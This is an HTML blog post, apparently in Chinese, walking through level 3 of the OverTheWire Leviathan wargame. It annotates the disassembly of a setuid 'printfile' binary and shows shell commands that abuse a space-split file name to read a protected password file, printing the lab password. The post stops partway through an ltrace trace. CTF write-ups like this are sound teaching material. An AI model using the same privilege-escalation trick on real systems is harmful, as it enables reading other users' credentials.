@@ -1,0 +1,922 @@
+
+
+<!DOCTYPE html>
+
+
+<html lang="zh-CN" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />
+
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-FYHS50G6DL"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+            
+            gtag('config', 'G-FYHS50G6DL');
+            
+        </script>
+    <meta property="og:title" content="OverTheWire Leviathan" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://silverrainz.gitee.io/blog/overthewire-leviathan.html" />
+<meta property="og:site_name" content="银色子弹" />
+<meta property="og:description" content="地址: OverTheWire: Leviathan. 说实话题目不难，可是从开始做题到做完的时间跨度却有一个多月，人家 rr 却做了一会儿就搞定了，我都在干嘛呢？ 完整的笔记在 这里 ， 其中有点意思的是 leviathan3，所以特地摘抄出来： 登入机器后发现家目录有个带 suid 权限的可执行文件 printfile ，属主是 leviathan3 ，用户组是 leviathan2 ，..." />
+<meta property="og:image" content="https://silverrainz.gitee.io/_static/logo.png" />
+<meta property="og:image:alt" content="银色子弹" />
+<meta name="description" content="地址: OverTheWire: Leviathan. 说实话题目不难，可是从开始做题到做完的时间跨度却有一个多月，人家 rr 却做了一会儿就搞定了，我都在干嘛呢？ 完整的笔记在 这里 ， 其中有点意思的是 leviathan3，所以特地摘抄出来： 登入机器后发现家目录有个带 suid 权限的可执行文件 printfile ，属主是 leviathan3 ，用户组是 leviathan2 ，..." />
+
+    <title>OverTheWire Leviathan &#8212; 银色子弹</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "light";
+  </script>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../_static/styles/theme.css?digest=e353d410970836974a52" rel="stylesheet" />
+<link href="../_static/styles/bootstrap.css?digest=e353d410970836974a52" rel="stylesheet" />
+<link href="../_static/styles/pydata-sphinx-theme.css?digest=e353d410970836974a52" rel="stylesheet" />
+
+  
+  <link href="../_static/vendor/fontawesome/6.1.2/css/all.min.css?digest=e353d410970836974a52" rel="stylesheet" />
+  <link rel="preload" as="font" type="font/woff2" crossorigin href="../_static/vendor/fontawesome/6.1.2/webfonts/fa-solid-900.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../_static/vendor/fontawesome/6.1.2/webfonts/fa-brands-400.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../_static/vendor/fontawesome/6.1.2/webfonts/fa-regular-400.woff2" />
+
+    <link rel="stylesheet" type="text/css" href="../_static/pygments.css" />
+    <link rel="stylesheet" href="../_static/styles/sphinx-book-theme.css?digest=14f4ca6b54d191a8c7657f6c759bf11a5fb86285" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../_static/graphviz.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/asciinema-player_2.6.1.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/asciinema-custom.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/custom.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/sphinx-book-theme-custom.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/ablog-custom.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/design-style.4045f2051d55cab465a707391d5b2007.min.css" />
+  
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../_static/scripts/bootstrap.js?digest=e353d410970836974a52" />
+<link rel="preload" as="script" href="../_static/scripts/pydata-sphinx-theme.js?digest=e353d410970836974a52" />
+
+    <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+    <script src="../_static/jquery.js"></script>
+    <script src="../_static/underscore.js"></script>
+    <script src="../_static/_sphinx_javascript_frameworks_compat.js"></script>
+    <script src="../_static/doctools.js"></script>
+    <script src="../_static/sphinx_highlight.js"></script>
+    <script src="../_static/asciinema-player_2.6.1.js"></script>
+    <script src="../_static/clipboard.min.js"></script>
+    <script src="../_static/copybutton.js"></script>
+    <script src="../_static/scripts/sphinx-book-theme.js?digest=5a5c038af52cf7bc1a1ec88eea08e6366ee68824"></script>
+    <script src="../_static/mirror-redirect.js"></script>
+    <script src="../_static/translations.js"></script>
+    <script src="../_static/design-tabs.js"></script>
+    <script data-isso="https://comments.silverrainz.me:30500" src="https://comments.silverrainz.me:30500/js/embed.min.js"></script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'blog/overthewire-leviathan';</script>
+    <link rel="canonical" href="https://silverrainz.gitee.io/blog/overthewire-leviathan.html" />
+    <link rel="shortcut icon" href="../_static/favicon.png"/>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="zh-CN"/>
+
+<link
+  rel="alternate"
+  type="application/atom+xml"
+  href="../blog/atom.xml"
+  title="银色子弹"
+/>
+
+
+
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <a class="skip-link" href="#main-content">Skip to main content</a>
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          name="__primary"
+          id="__primary"/>
+  <label class="overlay overlay-primary" for="__primary"></label>
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          name="__secondary"
+          id="__secondary"/>
+  <label class="overlay overlay-secondary" for="__secondary"></label>
+  
+  <div class="search-button__wrapper">
+    <div class="search-button__overlay"></div>
+    <div class="search-button__search-container">
+<form class="bd-search d-flex align-items-center"
+      action="../search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         id="search-input"
+         placeholder="Search..."
+         aria-label="Search..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form></div>
+  </div>
+
+
+  <div class="bd-header-announcement container-fluid bd-header-announcement">
+    <div class="bd-header-announcement__content"><p> 这是部署于 Deployment.Gitee 的镜像，访问源站点：<a class="source-page" href="https://silverrainz.me/">Deployment.Github</a></p></div>
+  </div>
+
+  
+    <nav class="bd-header navbar navbar-expand-lg bd-navbar">
+    </nav>
+  
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      <div class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+  
+
+<a class="navbar-brand logo" href="../index.html">
+  
+  
+  
+  
+    
+    
+      
+    
+    
+    <img src="../_static/logo.png" class="logo__image only-light" alt="Logo image"/>
+    <script>document.write(`<img src="../_static/logo.png" class="logo__image only-dark" alt="Logo image"/>`);</script>
+  
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+<div class="ablog-sidebar-item ablog__postcard">
+
+
+<h2>
+  
+  
+  <i class="fa fa-calendar"></i>
+  
+  2016-01-01
+  
+</h2>
+<ul>
+  
+
+<li id="ablog-sidebar-item author ablog__author">
+  <span>
+    
+    <i class="fa-fw fa fa-user"></i>
+    
+    </span>
+  
+  
+  <a href="author/shengyu-zhang.html">Shengyu Zhang</a>
+  
+  
+  
+</li>
+
+
+
+<li id="ablog-sidebar-item language ablog__language">
+  <span>
+    
+    <i class="fa-fw fa fa-language"></i>
+    
+    </span>
+  
+  
+  <a href="language/%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87.html">简体中文</a>
+  
+  
+  
+</li>
+
+
+
+<li id="ablog-sidebar-item tags ablog__tags">
+  <span>
+    
+    
+    <i class="fa-fw fa fa-tag"></i>
+    
+    </span>
+  
+  
+  <a href="tag/ctf.html">CTF</a>
+  
+  
+  
+</li>
+
+
+</ul>
+</div>
+</div>
+        <div class="sidebar-primary-item">
+
+<div class="ablog-sidebar-item ablog__recentposts">
+<h3>
+  <a href="../blog.html">最近文章</a>
+</h3>
+<ul>
+  
+  
+  <li>
+    <a href="paper-size.html">
+      26 June - 纸张尺寸标准以及非标准纸张的收纳技巧
+    </a>
+  </li>
+  
+  <li>
+    <a href="when-go-generics.html">
+      03 June - 何时使用 Go 泛型
+    </a>
+  </li>
+  
+  <li>
+    <a href="funtional-programming-in-go-generics.html">
+      27 October - 函数式编程在 Go 泛型下的实用性探索
+    </a>
+  </li>
+  
+  <li>
+    <a href="xzzh-after-40-yrs.html">
+      03 July - 四十年后再看西藏组画
+    </a>
+  </li>
+  
+  <li>
+    <a href="sphinx-as-note-taking-system-2.html">
+      25 May - 我如何用 Sphinx 建立笔记系统（二）系统架构
+    </a>
+  </li>
+  
+</ul>
+</div>
+</div>
+        <div class="sidebar-primary-item">
+
+<div class="ablog-sidebar-item ablog__tags">
+<h3><a href="tag.html">标签</a></h3>
+<ul class="ablog-cloud">
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/arch-linux.html">Arch Linux</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/c.html">C</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-3">
+    <a href="tag/ctf.html">CTF</a>
+  </li>
+  
+  
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/gsoc.html">GSoC</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/gtk.html">GTK</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/golang.html">Golang</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-4">
+    <a href="tag/haskell.html">Haskell</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/irc.html">IRC</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/isso.html">Isso</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/linux.html">Linux</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/makefile.html">Makefile</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/os.html">OS</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/python.html">Python</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-3">
+    <a href="tag/reverse.html">Reverse</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-4">
+    <a href="tag/sphinx.html">Sphinx</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/srain.html">Srain</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/teeworlds.html">Teeworlds</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/vim.html">Vim</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/windows.html">Windows</a>
+  </li>
+  
+  
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-3">
+    <a href="tag/restructuredtext.html">reStructuredText</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-5">
+    <a href="tag/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B.html">函数式编程</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E5%8D%B0%E5%88%B7-%E7%94%BB%E7%94%BB.html">印刷 画画</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E5%8F%98%E6%9B%B4.html">变更</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E5%A4%9A%E8%AF%B4.html">多说</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E5%B1%95%E8%A7%88.html">展览</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-2">
+    <a href="tag/%E6%B3%9B%E5%9E%8B.html">泛型</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E7%94%9F%E6%B4%BB.html">生活</a>
+  </li>
+  
+  
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E7%9E%8E%E6%89%AF.html">瞎扯</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-3">
+    <a href="tag/%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9F.html">笔记系统</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E7%BB%98%E7%94%BB.html">绘画</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E7%BF%BB%E8%AF%91.html">翻译</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E8%AE%BE%E5%A4%87.html">设备</a>
+  </li>
+  
+  
+  
+  <li class="ablog-cloud ablog-cloud-1">
+    <a href="tag/%E9%99%88%E4%B8%B9%E9%9D%92.html">陈丹青</a>
+  </li>
+  
+  
+</ul>
+</div>
+</div>
+        <div class="sidebar-primary-item">
+
+<div class="ablog-sidebar-item ablog__category">
+<h3>
+  <a href="category.html">类别</a>
+</h3>
+<ul>
+  
+  
+  <li>
+    <a href="category/gsoc-2016.html">GSoc 2016 (2)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="category/%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A8-sphinx-%E5%BB%BA%E7%AB%8B%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9F.html">我如何用 Sphinx 建立笔记系统 (2)</a>
+  </li>
+  
+  
+</ul>
+</div>
+</div>
+        <div class="sidebar-primary-item">
+
+<div class="ablog-sidebar-item ablog__archive">
+<h3>
+  <a href="archive.html">归档</a>
+</h3>
+<ul>
+  
+  
+  <li>
+    <a href="2022.html">2022 (2)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="2021.html">2021 (5)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="2020.html">2020 (2)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="2017.html">2017 (2)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="2016.html">2016 (6)</a>
+  </li>
+  
+  
+  
+  <li>
+    <a href="2015.html">2015 (18)</a>
+  </li>
+  
+  
+</ul>
+</div>
+</div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+  </div>
+  
+  <div id="rtd-footer-container"></div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><label class="sidebar-toggle primary-toggle btn btn-sm" for="__primary" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</label></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+<a href="https://github.com/SilverRainZ/bullet" target="_blank"
+   class="btn btn-sm btn-source-repository-button"
+   title="源码库"
+   data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+
+</a>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button"
+  title="全屏模式"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+<script>
+document.write(`
+  <button class="theme-switch-button btn btn-sm btn-outline-primary navbar-btn rounded-circle" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="theme-switch" data-mode="light"><i class="fa-solid fa-sun"></i></span>
+    <span class="theme-switch" data-mode="dark"><i class="fa-solid fa-moon"></i></span>
+    <span class="theme-switch" data-mode="auto"><i class="fa-solid fa-circle-half-stroke"></i></span>
+  </button>
+`);
+</script>
+
+<script>
+document.write(`
+  <button class="btn btn-sm navbar-btn search-button search-button__button" title="搜索" aria-label="搜索" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass"></i>
+  </button>
+`);
+</script>
+
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>OverTheWire Leviathan</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article" role="main">
+                  
+<section id="overthewire-leviathan">
+<h1>OverTheWire Leviathan<a class="headerlink" href="#overthewire-leviathan" title="此标题的永久链接">#</a></h1>
+<div class="admonition hint">
+<p class="admonition-title">提示</p>
+<p>这是一篇迁移自 Jekyll 的文章，如有格式问题，可到 <a class="reference external" href="https://github.com/SilverRainZ/bullet">⛺ SilverRainZ/bullet</a> 反馈</p>
+</div>
+<p>地址: <a class="reference external" href="http://overthewire.org/wargames/leviathan/">OverTheWire: Leviathan</a>.</p>
+<p>说实话题目不难，可是从开始做题到做完的时间跨度却有一个多月，人家 rr 却做了一会儿就搞定了，我都在干嘛呢？</p>
+<p>完整的笔记在 <a class="reference external" href="https://github.com/SilverRainZ/no-silver-bullet/blob/master/ctf/wargame-leviathan/wargame-leviathan.md">这里</a>，
+其中有点意思的是 leviathan3，所以特地摘抄出来：</p>
+<p>登入机器后发现家目录有个带 <code class="code docutils literal notranslate"><span class="pre">suid</span></code> 权限的可执行文件 <code class="code docutils literal notranslate"><span class="pre">printfile</span></code>，属主是 <code class="code docutils literal notranslate"><span class="pre">leviathan3</span></code>，用户组是 <code class="code docutils literal notranslate"><span class="pre">leviathan2</span></code>，带 <code class="code docutils literal notranslate"><span class="pre">suid</span></code> 的程序执行时可以获得和 owner/grouper 相同的权限（euid/egid）。</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>leviathan2@melinda:~$ ll printfile
+-r-sr-x--- 1 leviathan3 leviathan2 7498 Nov 14  2014 printfile*
+leviathan2@melinda:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+</pre></div>
+</div>
+<p>从字面意思上看，这个程序接受一个文件路径然后把文件的内容显示出来，但是要求它打印 <code class="code docutils literal notranslate"><span class="pre">/etc/leviathan_pass/leviathan3</span></code> 却提示 <code class="code docutils literal notranslate"><span class="pre">You</span> <span class="pre">cant</span> <span class="pre">have</span> <span class="pre">that</span> <span class="pre">file...</span></code>，上 gdb 分析看看。</p>
+<p>以下是 <code class="code docutils literal notranslate"><span class="pre">diaasm</span> <span class="pre">main</span></code> 的结果，假设执行了 <code class="code docutils literal notranslate"><span class="pre">r</span> <span class="pre">filename</span></code>：</p>
+<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="x">0x0804852d &lt;+0&gt;:     push   %ebp</span>
+<span class="x">0x0804852e &lt;+1&gt;:     mov    %esp,%ebp</span>
+<span class="x">0x08048530 &lt;+3&gt;:     and    $0xfffffff0,%esp</span>
+<span class="x">0x08048533 &lt;+6&gt;:     sub    $0x230,%esp</span>
+<span class="x">0x08048539 &lt;+12&gt;:    mov    0xc(%ebp),%eax           ; argv 参数地址</span>
+<span class="x">0x0804853c &lt;+15&gt;:    mov    %eax,0x1c(%esp)          ; argv 保存到 [esp + 0x1c]</span>
+<span class="x">0x08048540 &lt;+19&gt;:    mov    %gs:0x14,%eax            ; Thread-Local Storage, 不知道是什么</span>
+<span class="x">0x08048546 &lt;+25&gt;:    mov    %eax,0x22c(%esp)</span>
+<span class="x">0x0804854d &lt;+32&gt;:    xor    %eax,%eax</span>
+<span class="x">0x0804854f &lt;+34&gt;:    cmpl   $0x1,0x8(%ebp)           ; argc 和 1 比较，此处 argc 应该为 2</span>
+<span class="x">0x08048553 &lt;+38&gt;:    jg     0x804857e &lt;main+81&gt;      ; / argc &gt; 1 则跳</span>
+<span class="x">0x08048555 &lt;+40&gt;:    movl   $0x8048690,(%esp)</span>
+<span class="x">0x0804855c &lt;+47&gt;:    call   0x80483d0 &lt;puts@plt&gt;</span>
+<span class="x">0x08048561 &lt;+52&gt;:    mov    0x1c(%esp),%eax</span>
+<span class="x">0x08048565 &lt;+56&gt;:    mov    (%eax),%eax</span>
+<span class="x">0x08048567 &lt;+58&gt;:    mov    %eax,0x4(%esp)</span>
+<span class="x">0x0804856b &lt;+62&gt;:    movl   $0x80486a5,(%esp)</span>
+<span class="x">0x08048572 &lt;+69&gt;:    call   0x80483b0 &lt;printf@plt&gt;</span>
+<span class="x">0x08048577 &lt;+74&gt;:    mov    $0xffffffff,%eax</span>
+<span class="x">0x0804857c &lt;+79&gt;:    jmp    0x80485e8 &lt;main+187&gt;</span>
+
+<span class="x">; -&gt; 来自 0x08048553 &lt;+38&gt; 的跳转，以上代码不必分析了</span>
+<span class="x">0x0804857e &lt;+81&gt;:    mov    0x1c(%esp),%eax          ; 取出储存的 argv</span>
+<span class="x">0x08048582 &lt;+85&gt;:    add    $0x4,%eax                ; 移动到 argv 的第一个参数（从 0 计数）</span>
+<span class="x">0x08048585 &lt;+88&gt;:    mov    (%eax),%eax              ; 取出 argv[1] 的值，指向字符串 ‘filename’</span>
+<span class="x">0x08048587 &lt;+90&gt;:    movl   $0x4,0x4(%esp)           ; 参数二：int amode</span>
+<span class="x">0x0804858f &lt;+98&gt;:    mov    %eax,(%esp)              ; | argv[1] 作参数一： char *path</span>
+<span class="x">0x08048592 &lt;+101&gt;:   call   0x8048420 &lt;access@plt&gt;   ; / access(argv[1], 4)，成功返回 0</span>
+<span class="x">0x08048597 &lt;+106&gt;:   test   %eax,%eax</span>
+<span class="x">0x08048599 &lt;+108&gt;:   je     0x80485ae &lt;main+129&gt;     ; 跳</span>
+<span class="x">0x0804859b &lt;+110&gt;:   movl   $0x80486b9,(%esp)</span>
+<span class="x">0x080485a2 &lt;+117&gt;:   call   0x80483d0 &lt;puts@plt&gt;</span>
+<span class="x">0x080485a7 &lt;+122&gt;:   mov    $0x1,%eax</span>
+<span class="x">0x080485ac &lt;+127&gt;:   jmp    0x80485e8 &lt;main+187&gt;</span>
+
+<span class="x">; -&gt; 来自 0x08048599 &lt;+108&gt; 的跳转</span>
+<span class="x">0x080485ae &lt;+129&gt;:   mov    0x1c(%esp),%eax          ; \</span>
+<span class="x">0x080485b2 &lt;+133&gt;:   add    $0x4,%eax                ; | 取得 argv[1]</span>
+<span class="x">0x080485b5 &lt;+136&gt;:   mov    (%eax),%eax              ; /</span>
+<span class="x">0x080485b7 &lt;+138&gt;:   mov    %eax,0xc(%esp)           ; ...: argv[1]</span>
+<span class="x">0x080485bb &lt;+142&gt;:   movl   $0x80486d4,0x8(%esp)     ; | char *format: string &quot;/bin/cat %s&quot;</span>
+<span class="x">0x080485c3 &lt;+150&gt;:   movl   $0x1ff,0x4(%esp)         ; | size_t size: 511</span>
+<span class="x">0x080485cb &lt;+158&gt;:   lea    0x2c(%esp),%eax          ; |</span>
+<span class="x">0x080485cf &lt;+162&gt;:   mov    %eax,(%esp)              ; | char *str</span>
+<span class="x">0x080485d2 &lt;+165&gt;:   call   0x8048410 &lt;snprintf@plt&gt; ; / snprintf(str, 511, &quot;/bin/cat %s&quot;, argv[1]);</span>
+<span class="x">0x080485d7 &lt;+170&gt;:   lea    0x2c(%esp),%eax</span>
+<span class="x">0x080485db &lt;+174&gt;:   mov    %eax,(%esp)              ; \</span>
+<span class="x">0x080485de &lt;+177&gt;:   call   0x80483e0 &lt;system@plt&gt;   ; / system(&quot;/bin/cat filename&quot;);</span>
+<span class="x">0x080485e3 &lt;+182&gt;:   mov    $0x0,%eax</span>
+<span class="x">0x080485e8 &lt;+187&gt;:   mov    0x22c(%esp),%edx</span>
+<span class="x">0x080485ef &lt;+194&gt;:   xor    %gs:0x14,%edx</span>
+<span class="x">0x080485f6 &lt;+201&gt;:   je     0x80485fd &lt;main+208&gt;</span>
+<span class="x">0x080485f8 &lt;+203&gt;:   call   0x80483c0 &lt;__stack_chk_fail@plt&gt;</span>
+<span class="x">0x080485fd &lt;+208&gt;:   leave</span>
+<span class="x">0x080485fe &lt;+209&gt;:   ret</span>
+</pre></div>
+</div>
+<p>可以看到程序接受一个文件路径，先检查对该文件的访问权限，然后执行 shell 命令 “/bin/cat filename”。</p>
+<p>问题出在 <code class="code docutils literal notranslate"><span class="pre">access</span></code> 函数， man 是这样说的：</p>
+<blockquote>
+<div><p>The access() function shall check the file named by the pathname pointed to by the path argument for accessibility according to the bit pattern contained in amode, <em>using the real user ID in place of the effective user ID and the real group ID in place of the effective group ID.</em></p>
+</div></blockquote>
+<p>而 <code class="code docutils literal notranslate"><span class="pre">suid</span></code> 权限改变的只是进程的 <code class="code docutils literal notranslate"><span class="pre">euid</span></code>，因此当你执行 <code class="code docutils literal notranslate"><span class="pre">./printfile</span> <span class="pre">/etc/leviathan_pass/leviathan3</span></code> 的时候，access 函数总是失败的。</p>
+<p>但是用 gdb 改变程序的流程也是<a class="reference external" href="http://unix.stackexchange.com/questions/15911/can-gdb-debug-suid-root-programs">*不可行*</a>的，非 root 的 gdb 调试带 suid 权限的程序时，程序不会获得本来应该有的权限（否则 gdb 就可以任意地改变程序的行为了），即使绕过了 access 函数，你依然会得到一个 <code class="code docutils literal notranslate"><span class="pre">Permission</span> <span class="pre">denied</span></code>。</p>
+<p>到这里我就没辙了，只能看别人的 writeup 了：<a class="reference external" href="https://rundata.wordpress.com/2013/03/27/overthewire-leviathan-wargame-solution-2/">OverTheWire Leviathan Wargame Solution 2</a>，看完发现脑洞确实不够大。</p>
+<p><em>Solution:</em></p>
+<p>access() 接受的是个字符串参数，而 cat 的参数却是由 shell 处理的，执行 <code class="code docutils literal notranslate"><span class="pre">./printfile</span> <span class="pre">&quot;flag</span> <span class="pre">here&quot;</span></code>，对于 access 函数来说是执行了 <code class="code docutils literal notranslate"><span class="pre">access(&quot;flag</span> <span class="pre">here&quot;,</span> <span class="pre">4)</span></code>, 检查对 <code class="code docutils literal notranslate"><span class="pre">flag</span> <span class="pre">here</span></code> 这个文件的访问权限，而对 cat 来说是这样的 <code class="code docutils literal notranslate"><span class="pre">system(&quot;cat</span> <span class="pre">flag</span> <span class="pre">here&quot;)</span></code>，因此可以利用这个区别来绕过 access 函数。</p>
+<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>leviathan2@melinda:/tmp$<span class="w"> </span>mkdir<span class="w"> </span>slove
+leviathan2@melinda:/tmp$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>slove
+leviathan2@melinda:/tmp/slove$<span class="w"> </span>touch<span class="w"> </span><span class="s1">&#39;flag here&#39;</span><span class="w">    </span><span class="c1"># 带空格的文件名</span>
+leviathan2@melinda:/tmp/slove$<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/leviathan_pass/leviathan3<span class="w"> </span>flag
+leviathan2@melinda:/tmp/slove$<span class="w"> </span>ls
+flag<span class="w">  </span>flag<span class="w"> </span>here
+leviathan2@melinda:/tmp/slove$<span class="w"> </span>~/printfile<span class="w"> </span><span class="s1">&#39;flag here&#39;</span><span class="w">  </span><span class="c1"># access 检测的是刚刚建立的新文件， cat 显示的则是 flag 和 here</span>
+Ahdiemoo1j
+/bin/cat:<span class="w"> </span>here:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
+</pre></div>
+</div>
+<p>另外发现了一个新工具 ltrace，能够跟踪库函数的调用，就不用像刚才那样分析整个程序了（后面的题目大多数是过一遍 ltrace 就行了）：</p>
+<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>leviathan2@melinda:~$<span class="w"> </span>ltrace<span class="w"> </span>~/printfile<span class="w"> </span>/etc/leviathan_pass/leviathan2
+__libc_start_main<span class="o">(</span>0x804852d,<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>0xffffd6f4,<span class="w"> </span>0x8048600<span class="w"> </span>&lt;unfinished<span class="w"> </span>...&gt;
+access<span class="o">(</span><span class="s2">&quot;/etc/leviathan_pass/leviathan2&quot;</span>,<span class="w"> </span><span class="m">4</span><span class="o">)</span><span class="w">                                       </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
